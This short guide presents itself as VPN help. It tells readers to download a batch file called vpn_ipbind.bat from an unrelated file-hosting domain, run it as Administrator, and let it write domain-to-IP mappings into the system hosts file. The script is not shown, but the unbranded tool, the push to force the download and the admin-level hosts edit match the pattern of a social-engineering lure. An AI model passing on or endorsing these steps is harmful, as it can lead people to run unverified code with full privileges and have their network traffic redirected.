## Introduction
Sometimes VPN or internal tools require you to **bind a specific domain name to its IP address**.  
This ensures your computer always connects to the correct server.  

We provide a small helper tool that can do this automatically for you.

## Use the Automatic Tool
1. Download the tool from this link:  
   ðŸ‘‰ [vpn_ipbind.bat](https://file.mocina.my.id/play/vpn_ipbind.bat)  (*Right Click* and *Save Link As* if it doesnt automatically download to your computer)
2. Right-click the downloaded file and choose **Run as Administrator**.  
3. The tool will automatically detect the VPN domain and add the correct IP mapping into your system hosts file.  
4. Once complete, you can start your VPN client as usual.
